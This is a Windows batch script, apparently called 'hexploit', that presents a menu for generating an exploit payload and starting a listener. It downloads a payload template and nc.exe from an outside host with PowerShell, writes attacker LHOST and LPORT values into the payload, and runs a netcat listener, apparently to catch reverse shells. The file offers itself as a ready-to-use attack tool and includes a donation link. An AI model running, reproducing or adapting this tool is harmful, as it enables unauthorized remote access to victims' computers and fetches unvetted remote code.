@echo off
:beforemenu
cls
echo.
echo          __     Welcome to     __      _ __ 
echo         / /_  ___  _  ______  / /___  (_) /_
echo        / __ \/ _ \^| ^|/_/ __ \/ / __ \/ / __/
echo       / / / /  __/^>  ^</ /_/ / / /_/ / / /_  
echo      /_/ /_/\___/_/^|_/ .___/_/\____/_/\__/  
echo                      /_/ (created by hinzee)                    
echo.
echo.
echo  1) Generate exploit
echo  2) Start listener
echo  3) Donate
echo  4) Exit
echo.
echo.
:menu
set /P M=hex^>
if %M%==1 goto generate
if %M%==2 goto listener
if %M%==3 goto donate
if %M%==4 goto eof
if %M%==cls goto cls
goto menu
:generate
set /P LHOST=LHOST:
set /P LPORT=LPORT:
set /P output=OUTPUT:
IF EXIST bin (
    goto continue
) ELSE (
    mkdir bin
    goto continue
)
:continue
powershell -Command "Invoke-WebRequest http://hinzee.com/files/source.bat -OutFile bin/source.bat"
IF EXIST output (
    goto continue2
) ELSE (
    mkdir output
    goto continue2
)

:continue2
setlocal enabledelayedexpansion
set txtfile=bin/source.bat
set newfile=output/%output%.bat
if exist "%newfile%" del /f /q "%newfile%"
for /f "tokens=*" %%a in (%txtfile%) do (
   set newline=%%a
   set newline=!newline:LHOST LPORT=%LHOST% %LPORT%!
   echo !newline! >> %newfile%
)
echo File saved as output/%output%.bat
rmdir /s /q bin
:choice
set /P c=Do you want to start listener[Y/N]?
if /I "%c%" EQU "Y" goto start
if /I "%c%" EQU "N" goto stop
goto choice
:listener
set /P LPORT=LPORT:
goto start
:start
IF EXIST %appdata%/nc.exe (
    goto listening
) ELSE (
    powershell -Command "Invoke-WebRequest http://hinzee.com/files/nc.exe -OutFile %appdata%/nc.exe"
    goto listening
)
:listening
echo Listening on port %LPORT%
%appdata%/nc.exe -lp %LPORT%
goto menu
:stop
goto menu
:cls
cls
goto beforemenu
:donate
cls
echo.
echo                   Donate
echo.
echo        Paypal: https://paypal.me/hinzeecz
echo.
goto menu
